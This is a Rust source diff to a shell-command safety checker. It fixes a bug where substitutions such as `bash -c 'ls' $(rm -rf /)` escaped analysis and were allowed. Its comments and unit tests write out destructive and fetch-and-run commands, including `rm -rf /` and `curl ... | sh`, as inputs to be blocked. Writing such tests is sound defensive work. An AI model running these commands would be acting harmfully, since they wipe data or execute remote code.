@@ -19,12 +19,19 @@
 //!    AND the substituted argv matches a blocklist rule. A resolved-but-
 //!    clean substitution stays Ask (never Allow — session state could
 //!    differ at runtime).
-//! 3. Argument-position `$()`/backtick ("rule 3") — recursed through the
-//!    full pipeline; the outer word is Allow-transparent (an inner Allow
-//!    does not force the outer command non-Allow) EXCEPT where rule 4's
-//!    target-constrained refinement independently routes to Ask because
-//!    that same substitution sits in a target-constrained rule's target
-//!    position (issue #34, `rm -rf $(echo /)`), Ask/Block propagate.
+//! 3. Argument-position `$()`/backtick/process substitution ("rule 3") —
+//!    recursed through the full pipeline; the outer word is Allow-
+//!    transparent (an inner Allow does not force the outer command
+//!    non-Allow) EXCEPT where rule 4's target-constrained refinement
+//!    independently routes to Ask because that same substitution sits in a
+//!    target-constrained rule's target position (issue #34, `rm -rf
+//!    $(echo /)`), Ask/Block propagate. Computed once, up front, in
+//!    [`evaluate_simple_command_core`] (issue #445) rather than only right
+//!    before [`fold_floors`]: several of `core`'s own early returns — rule
+//!    6a's inner-Allow return chief among them — never reach
+//!    `fold_floors`, so a substitution scanned only there would go
+//!    unanalyzed on exactly those paths (`bash -c 'ls' $(rm -rf /)` was
+//!    silently Allowed before this fix).
 //! 4. Argument-position bare `$VAR` or a `$()`/backtick substitution
 //!    ("rule 4") — Allow by default (`cd $HOME`, `echo $(date)`), EXCEPT
 //!    the NEW refinement: if the command+flags match a target-constrained
@@ -82,9 +89,13 @@
 //!    hit still Blocks, but a miss is Ask, never Allow, because a same-line
 //!    `IFS=` reassignment could have made the default-IFS fold wrong.
 //! 8. Every other unresolvable kind ("rule 8": `NonUtf8`, `ExpansionLimit`,
-//!    `UnsupportedStructure`, and command-position `ParameterExpansion`/
+//!    `UnsupportedStructure`, `ArithmeticExpansion`, `ProcessSubstitution`,
+//!    `EmbeddedNul`, and command-position `ParameterExpansion`/
 //!    `CommandSubstitution` once rules 1/2 have had their say) floors to
-//!    Ask, never Allow.
+//!    Ask, never Allow. Like rule
+//!    3, computed once up front in [`evaluate_simple_command_core`] (issue
+//!    #445) so it survives `core`'s own early returns too (`bash -c ls
+//!    <(rm -rf /)`).
 //! 9. Assignments-only and empty simple commands ("rule 9") — Allow; an
 //!    assignment's RHS is already recursed by rule 11 below, so what's left
 //!    here is only the resulting *value*'s later use, which rule 2 handles
@@ -2428,6 +2439,34 @@ fn evaluate_simple_command_core(
     // need it, not only a `fold_floors` path).
     let leftover_command_floor =
         leftover_command_block_floor(&leftover_alternatives, first_word_ast, &argv, rules);
+    // Rule 8 (argument-position half), computed up front for the same
+    // reason `leftover_floor` is (issue #445): `NonUtf8`/`ExpansionLimit`/
+    // `UnsupportedStructure`/`ArithmeticExpansion`/`ProcessSubstitution`/
+    // `EmbeddedNul` floor to Ask wherever they appear in `argv`, and this
+    // function's
+    // early returns below (rules 1/2/6a/6c/6e, the ordinary blocklist
+    // match) must not bypass that floor either (`bash -c ls <(rm -rf /)`).
+    let opaque_kind = argv.iter().find_map(|w| match w.resolution() {
+        Resolution::Unresolvable(kind) if is_opaque_unresolvable(*kind) => Some(*kind),
+        _ => None,
+    });
+    // Rule 3: argument-position `$()`/backtick/process-substitution
+    // recursion. An inner Allow never forces the outer command non-Allow;
+    // Ask/Block propagate. Computed up front, alongside `leftover_floor`
+    // (already folded in here), for the same reason (issue #445): this
+    // function's early returns below (rules 1/2/6a/6c/6e, the ordinary
+    // blocklist match) previously bypassed rule 3 entirely, silently
+    // Allowing a dangerous argument-position substitution on a `bash -c`
+    // invocation (`bash -c 'ls' $(rm -rf /)`). Issue #77: `leftover_floor`
+    // folds in the command-position word's own non-winning brace branches,
+    // which resolve to argument-position tokens once brace-expanded — a
+    // substitution living in one of them must still be recursed here,
+    // since `argument_words` alone (everything after `first_word_ast`)
+    // never sees content embedded in that same AST word.
+    let substitution_result = fold_optional_decision(
+        evaluate_argument_substitutions(argument_words, depth, rules, allowlist, cwd),
+        leftover_floor,
+    );
     let mut command_position_subs = Vec::new();
     let mut command_position_proc_subs = Vec::new();
     if let Some(pieces) = &command_position_pieces {
@@ -2435,20 +2474,23 @@ fn evaluate_simple_command_core(
         collect_process_substitutions_into(pieces, &mut command_position_proc_subs);
     }
     if !command_position_subs.is_empty() || !command_position_proc_subs.is_empty() {
-        return apply_leftover_substitution_floor(
-            apply_leftover_command_floor(
-                evaluate_command_position_substitution(
-                    &command_position_subs,
-                    &command_position_proc_subs,
-                    argv,
-                    rules,
-                    allowlist,
-                    depth,
-                    cwd,
+        return apply_opaque_kind_floor(
+            apply_substitution_floor(
+                apply_leftover_command_floor(
+                    evaluate_command_position_substitution(
+                        &command_position_subs,
+                        &command_position_proc_subs,
+                        argv,
+                        rules,
+                        allowlist,
+                        depth,
+                        cwd,
+                    ),
+                    leftover_command_floor.clone(),
                 ),
-                leftover_command_floor.clone(),
+                substitution_result,
             ),
-            leftover_floor,
+            opaque_kind,
         );
     }
 
@@ -2458,33 +2500,39 @@ fn evaluate_simple_command_core(
     // instead of the raw `argv[0]`.
     match argv[0].resolution() {
         Resolution::Unresolvable(UnresolvableKind::ParameterExpansion) => {
-            return apply_leftover_substitution_floor(
-                apply_leftover_command_floor(
-                    evaluate_command_position_bare_var(
-                        first_word_ast,
-                        argv,
-                        env,
-                        rules,
-                        alternates,
+            return apply_opaque_kind_floor(
+                apply_substitution_floor(
+                    apply_leftover_command_floor(
+                        evaluate_command_position_bare_var(
+                            first_word_ast,
+                            argv,
+                            env,
+                            rules,
+                            alternates,
+                        ),
+                        leftover_command_floor,
                     ),
-                    leftover_command_floor,
+                    substitution_result,
                 ),
-                leftover_floor,
+                opaque_kind,
             );
         }
         Resolution::Unresolvable(kind) => {
-            return apply_leftover_substitution_floor(
-                apply_leftover_command_floor(
-                    Verdict::ask(
-                        Reason::new(format!(
-                            "command position word is unresolvable ({kind:?}); which command \
-                             will run cannot be determined statically"
-                        )),
-                        argv,
+            return apply_opaque_kind_floor(
+                apply_substitution_floor(
+                    apply_leftover_command_floor(
+                        Verdict::ask(
+                            Reason::new(format!(
+                                "command position word is unresolvable ({kind:?}); which \
+                                 command will run cannot be determined statically"
+                            )),
+                            argv,
+                        ),
+                        leftover_command_floor,
                     ),
-                    leftover_command_floor,
+                    substitution_result,
                 ),
-                leftover_floor,
+                opaque_kind,
             );
         }
         Resolution::Resolved(_) => {}
@@ -2558,9 +2606,12 @@ fn evaluate_simple_command_core(
         && let Some(outcome) =
             evaluate_dash_c(&argv, rest_words, name, rules, allowlist, depth, cwd)
     {
-        return apply_leftover_substitution_floor(
-            apply_escalation_floor(outcome, escalation_floor),
-            leftover_floor,
+        return apply_opaque_kind_floor(
+            apply_substitution_floor(
+                apply_escalation_floor(outcome, escalation_floor),
+                substitution_result,
+            ),
+            opaque_kind,
         );
     }
 
@@ -2570,9 +2621,12 @@ fn evaluate_simple_command_core(
         && EVAL_BUILTIN.contains(&name)
         && let Some(outcome) = evaluate_eval(&argv, rest_words, rules, allowlist, depth, cwd)
     {
-        return apply_leftover_substitution_floor(
-            apply_escalation_floor(outcome, escalation_floor),
-            leftover_floor,
+        return apply_opaque_kind_floor(
+            apply_substitution_floor(
+                apply_escalation_floor(outcome, escalation_floor),
+                substitution_result,
+            ),
+            opaque_kind,
         );
     }
 
@@ -2584,37 +2638,44 @@ fn evaluate_simple_command_core(
     // wrapped command (see `crate::rules::builtin_loadable_library`'s docs).
     match crate::rules::builtin_loadable_library(&argv) {
         crate::rules::BuiltinLoadableLibrary::Present => {
-            return apply_leftover_substitution_floor(
-                apply_escalation_floor(
-                    Verdict::block(
-                        Reason::new(
-                            "builtin -f dlopen()s an arbitrary shared object and runs its \
-                             exported code as a new shell builtin"
-                                .to_string(),
+            return apply_opaque_kind_floor(
+                apply_substitution_floor(
+                    apply_escalation_floor(
+                        Verdict::block(
+                            Reason::new(
+                                "builtin -f dlopen()s an arbitrary shared object and runs its \
+                                 exported code as a new shell builtin"
+                                    .to_string(),
+                            ),
+                            argv.clone(),
+                            None,
                         ),
-                        argv.clone(),
-                        None,
+                        escalation_floor,
                     ),
-                    escalation_floor,
+                    substitution_result,
                 ),
-                leftover_floor,
+                opaque_kind,
             );
         }
         crate::rules::BuiltinLoadableLibrary::Uncertain => {
-            return apply_leftover_substitution_floor(
-                apply_escalation_floor(
-                    Verdict::ask(
-                        Reason::new(
-                            "`builtin`'s own leading token could not be statically resolved, so \
-                             whether it is a flag that loads a shared object (`-f`) or the \
-                             dispatched command's own name cannot be determined"
-                                .to_string(),
+            return apply_opaque_kind_floor(
+                apply_substitution_floor(
+                    apply_escalation_floor(
+                        Verdict::ask(
+                            Reason::new(
+                                "`builtin`'s own leading token could not be statically \
+                                 resolved, so whether it is a flag that loads a shared object \
+                                 (`-f`) or the dispatched command's own name cannot be \
+                                 determined"
+                                    .to_string(),
+                            ),
+                            argv.clone(),
                         ),
-                        argv.clone(),
+                        escalation_floor,
                     ),
-                    escalation_floor,
+                    substitution_result,
                 ),
-                leftover_floor,
+                opaque_kind,
             );
         }
         crate::rules::BuiltinLoadableLibrary::Absent => {}
@@ -2668,26 +2729,6 @@ fn evaluate_simple_command_core(
 
     // Rule 7: any `$IFS`-derived word floors to Ask on a blocklist miss.
     let ifs_floor = argv.iter().any(NormalizedWord::is_ifs_derived);
-
-    // Rule 8 (argument-position half): NonUtf8/ExpansionLimit/
-    // UnsupportedStructure floor to Ask wherever they appear.
-    let opaque_kind = argv.iter().find_map(|w| match w.resolution() {
-        Resolution::Unresolvable(kind) if is_opaque_unresolvable(*kind) => Some(*kind),
-        _ => None,
-    });
-
-    // Rule 3: argument-position `$()`/backtick recursion. An inner Allow
-    // never forces the outer command non-Allow; Ask/Block propagate.
-    // Issue #77: `leftover_floor` (computed up front, above) folds in the
-    // command-position word's own non-winning brace branches, which
-    // resolve to argument-position tokens once brace-expanded — a
-    // substitution living in one of them must still be recursed here,
-    // since `argument_words` alone (everything after `first_word_ast`)
-    // never sees content embedded in that same AST word.
-    let substitution_result = fold_optional_decision(
-        evaluate_argument_substitutions(argument_words, depth, rules, allowlist, cwd),
-        leftover_floor,
-    );
 
     // Rule 4 (NEW): argument-position bare `$VAR` or a `$()`/backtick
     // substitution (issue #34 extends this rule beyond its original
@@ -2746,10 +2787,8 @@ fn evaluate_simple_command_core(
 
     // Stage 3: the ordinary exact-argv blocklist match. A rule can itself
     // carry `Decision::Ask` (e.g. `tar-directory-root-or-home`) — the
-    // leftover-substitution floor must still be able to lift that to
-    // `Block` (issue #77), the same as every
-    // other return in this function since `leftover_alternatives` became
-    // available.
+    // substitution floor must still be able to lift that to `Block`
+    // (issues #77/#445), the same as every other return in this function.
     if let Some(rule) = rules.match_command(&argv) {
         let reason = Reason::new(format!(
             "matches blocklist rule {:?}: {}",
@@ -2762,9 +2801,12 @@ fn evaluate_simple_command_core(
             Decision::Allow => unreachable!("rules never carry Decision::Allow"),
         }
         .with_deny_message(rule.deny_message().cloned());
-        return apply_leftover_substitution_floor(
-            apply_escalation_floor(verdict, escalation_floor),
-            leftover_floor,
+        return apply_opaque_kind_floor(
+            apply_substitution_floor(
+                apply_escalation_floor(verdict, escalation_floor),
+                substitution_result,
+            ),
+            opaque_kind,
         );
     }
 
@@ -3367,18 +3409,32 @@ fn apply_dirstack_equal_subst_floor(
     apply_floor(verdict, floor_decision, floor_reason, deny_message)
 }
 
-/// Applies issue #77's leftover-alternative substitution floor
-/// (`evaluate_leftover_alternative_substitutions`'s result) to a verdict —
-/// the same max-lift mechanics as [`apply_floor`]. Unlike the other floors
-/// here, this one is applied at MULTIPLE call sites (rules
-/// 1/2/6a's early returns, plus folded into [`fold_floors`]'s own
-/// `substitution_result`) rather than just once before `fold_floors` — see
-/// [`evaluate_simple_command_core`]'s `leftover_floor` binding for why:
-/// this function has several early returns that would otherwise never see
-/// a leftover branch's substitution at all. Reason text mirrors [`fold_floors`]'s own
-/// `substitution_result` messaging so a floored verdict reads the same
+/// Applies rule 3's argument-position substitution floor to a verdict — the
+/// same max-lift mechanics as [`apply_floor`]. The floor passed in is
+/// [`evaluate_simple_command_core`]'s `substitution_result` binding, which
+/// already folds together [`evaluate_argument_substitutions`]'s own result
+/// (a `$()`/backtick/process substitution in ordinary argument position)
+/// with issue #77's leftover-alternative substitution floor
+/// (`evaluate_leftover_alternative_substitutions`'s result, a substitution
+/// living in a brace alternative other than the one determining the
+/// command name) via `fold_optional_decision` — the two are Allow-
+/// transparent/Ask/Block-propagating in exactly the same way, so one floor
+/// serves both. Unlike the other floors here, this one is applied at
+/// MULTIPLE call sites (rules 1/2/6a/6c/6e's early returns and the ordinary
+/// blocklist match, plus [`fold_floors`] itself) rather than just once
+/// before `fold_floors` — see [`evaluate_simple_command_core`]'s
+/// `substitution_result` binding for why (issue #445): this function has
+/// several early returns that would otherwise never see an argument-
+/// position substitution at all (`bash -c 'ls' $(rm -rf /)` was silently
+/// Allowed before this floor existed). Reason text mirrors [`fold_floors`]'s
+/// own `substitution_result` messaging so a floored verdict reads the same
 /// regardless of which return path triggered it.
-fn apply_leftover_substitution_floor(verdict: Verdict, floor: Option<Decision>) -> Verdict {
+const SUBSTITUTION_FLOOR_BLOCK_REASON: &str = "an argument-position command/backquote or \
+    process substitution recurses to a command that is itself blocked";
+const SUBSTITUTION_FLOOR_ASK_REASON: &str = "an argument-position command/backquote or process \
+    substitution's inner command could not be resolved to Allow";
+
+fn apply_substitution_floor(verdict: Verdict, floor: Option<Decision>) -> Verdict {
     let Some(floor_decision) = floor else {
         return verdict;
     };
@@ -3387,15 +3443,8 @@ fn apply_leftover_substitution_floor(verdict: Verdict, floor: Option<Decision>) 
     }
     let argv = verdict.normalized_argv().to_vec();
     let floor_reason = match floor_decision {
-        Decision::Block => {
-            "a command/backquote or process substitution living in a brace alternative other \
-             than the one determining the command name recurses to a command that is itself \
-             blocked"
-        }
-        Decision::Ask | Decision::Allow => {
-            "a command/backquote or process substitution living in a brace alternative other \
-             than the one determining the command name could not be resolved to Allow"
-        }
+        Decision::Block => SUBSTITUTION_FLOOR_BLOCK_REASON,
+        Decision::Ask | Decision::Allow => SUBSTITUTION_FLOOR_ASK_REASON,
     };
     let reason = match verdict.reason() {
         Some(existing) => format!("{}; {floor_reason}", existing.as_str()),
@@ -3405,6 +3454,34 @@ fn apply_leftover_substitution_floor(verdict: Verdict, floor: Option<Decision>) 
         Decision::Block => Verdict::block(Reason::new(reason), argv, None),
         Decision::Ask | Decision::Allow => Verdict::ask(Reason::new(reason), argv),
     }
+}
+
+/// Applies rule 8's opaque-unresolvable-kind floor
+/// ([`is_opaque_unresolvable`]) to a verdict — the same max-lift mechanics
+/// as [`apply_floor`]. Like [`apply_substitution_floor`], this is applied
+/// at MULTIPLE call sites (issue #445: rules 1/2/6a/6c/6e's early returns
+/// and the ordinary blocklist match, plus [`fold_floors`] itself), since
+/// `evaluate_simple_command_core`'s `opaque_kind` binding must survive the
+/// same early returns rule 3 does — a process substitution in argument
+/// position of a `bash -c` invocation (`bash -c ls <(rm -rf /)`) is exactly
+/// as opaque on the 6a early-return path as it is anywhere else. Reason
+/// text mirrors [`fold_floors`]'s own `opaque_kind` messaging.
+fn apply_opaque_kind_floor(verdict: Verdict, kind: Option<UnresolvableKind>) -> Verdict {
+    let Some(kind) = kind else {
+        return verdict;
+    };
+    if verdict.decision() >= Decision::Ask {
+        return verdict;
+    }
+    let argv = verdict.normalized_argv().to_vec();
+    let floor_reason = format!(
+        "a word is unresolvable ({kind:?}) and is not covered by a more specific structural rule"
+    );
+    let reason = match verdict.reason() {
+        Some(existing) => format!("{}; {floor_reason}", existing.as_str()),
+        None => floor_reason,
+    };
+    Verdict::ask(Reason::new(reason), argv)
 }
 
 /// Rules 4 and 4b's argument-position-ambiguity floors, bundled into one
@@ -3506,17 +3583,9 @@ fn fold_floors(
     if let Some(sub_decision) = substitution_result {
         decision = decision.max(sub_decision);
         if sub_decision == Decision::Block {
-            reasons.push(
-                "an argument-position command/backquote substitution recurses to a command that \
-                 is itself blocked"
-                    .to_string(),
-            );
+            reasons.push(SUBSTITUTION_FLOOR_BLOCK_REASON.to_string());
         } else if sub_decision == Decision::Ask {
-            reasons.push(
-                "an argument-position command/backquote substitution's inner command could not \
-                 be resolved to Allow"
-                    .to_string(),
-            );
+            reasons.push(SUBSTITUTION_FLOOR_ASK_REASON.to_string());
         }
     }
 
@@ -16135,6 +16204,95 @@ done"#,
         // invocation under an unrelated folded cwd must stay Allow, same
         // as the bare invocation.
         assert_decision("cd /tmp && ./deploy.sh --prod", Decision::Allow);
+    }
+
+    // ==== Issue #445: `evaluate_simple_command_core`'s early returns (rule
+    // 6a's `bash -c`/`sh -c` recursion chief among them, but also rules 1/2,
+    // `eval`, `builtin -f`, and the ordinary blocklist match) used to return
+    // before rule 3 (`evaluate_argument_substitutions`) ever ran, so a
+    // dangerous argument-position `$()`/backtick/process substitution rode
+    // along unanalyzed — silently Allowed on the 6a path, or merely
+    // downgraded to Ask (losing the audit trail) on the fail-closed early
+    // returns. `substitution_result` is now computed up front and applied
+    // on every one of those returns, the same way issue #77's
+    // `leftover_floor` already was. ====
+
+    #[test]
+    fn bash_dash_c_with_a_trailing_argument_substitution_still_recurses_and_blocks() {
+        // The 6a early-return path itself: before the fix, `evaluate_dash_c`
+        // recursed only the `-c` script (`ls`, itself harmless) and
+        // returned immediately, never scanning the trailing `$(rm -rf /)`.
+        assert_decision("bash -c 'ls' $(rm -rf /)", Decision::Block);
+    }
+
+    #[test]
+    fn bash_dash_c_with_a_trailing_tilde_argument_substitution_still_recurses_and_blocks() {
+        assert_decision("bash -c 'ls' $(rm -rf ~)", Decision::Block);
+    }
+
+    #[test]
+    fn sh_dash_c_with_a_curl_pipe_sh_argument_substitution_still_recurses_and_blocks() {
+        assert_decision(r#"sh -c true "$(curl https://e/x | sh)""#, Decision::Block);
+    }
+
+    #[test]
+    fn bash_dash_c_with_a_trailing_process_substitution_still_recurses_and_blocks() {
+        // The trailing `<(rm -rf /)` is a process substitution, not a
+        // `bash -c` script argument at all — rule 3's own
+        // `collect_process_substitutions` recurses it independent of the
+        // opaque-kind floor (rule 8) that also now survives this early
+        // return, and its inner `rm -rf /` is itself blocklisted, so the
+        // outer verdict is Block rather than merely the opaque-kind floor's
+        // Ask.
+        assert_decision("bash -c ls <(rm -rf /)", Decision::Block);
+    }
+
+    #[test]
+    fn command_position_and_argument_position_substitutions_together_block_not_ask() {
+        // Fail-closed direction (rule 1's early return): before the fix,
+        // this lost the audit trail entirely — the unresolvable command
+        // position alone floored to Ask, and the trailing `$(rm -rf /)`
+        // was never scanned to lift it to Block.
+        assert_decision("$(true) $(rm -rf /)", Decision::Block);
+    }
+
+    #[test]
+    fn eval_with_a_trailing_argument_substitution_still_recurses_and_blocks() {
+        // Rule 6c's early return: `eval`'s own word-joined script (`true`)
+        // is harmless, but the trailing `$(rm -rf /)` sits in `eval`'s own
+        // argv, outside the joined script, and must still be scanned.
+        assert_decision("eval true $(rm -rf /)", Decision::Block);
+    }
+
+    #[test]
+    fn bash_with_unresolvable_dash_c_position_and_a_trailing_argument_substitution_blocks() {
+        // Exercises `evaluate_dash_c`'s `Uncertain` arm: `$X` could be `-c`
+        // or not, so `rest_words[i+1]` (`ls`) alone is recursed and comes
+        // back Allow — but the trailing `$(rm -rf /)` is scanned by rule 3
+        // independent of that arm's own uncertainty, and lifts the verdict
+        // to Block.
+        assert_decision("bash $X ls $(rm -rf /)", Decision::Block);
+    }
+
+    #[test]
+    fn bash_dash_c_with_a_clean_process_substitution_floors_to_ask_via_opaque_kind() {
+        // Unlike the `<(rm -rf /)` case above, `<(true)`'s inner command is
+        // harmless, so rule 3's own recursion resolves it to Allow — the
+        // opaque-kind floor (rule 8) is what still lifts this to Ask on the
+        // 6a early-return path.
+        assert_decision("bash -c ls <(true)", Decision::Ask);
+    }
+
+    #[test]
+    fn bash_dash_c_with_an_arithmetic_expansion_argument_floors_to_ask() {
+        assert_decision("bash -c ls $((1+1))", Decision::Ask);
+    }
+
+    #[test]
+    fn bash_dash_c_with_a_clean_argument_substitution_stays_allow() {
+        // Confirms the floor is Allow-transparent: a harmless trailing
+        // substitution must not itself lift an otherwise-Allow verdict.
+        assert_decision("bash -c 'ls' $(true)", Decision::Allow);
     }
 }
 
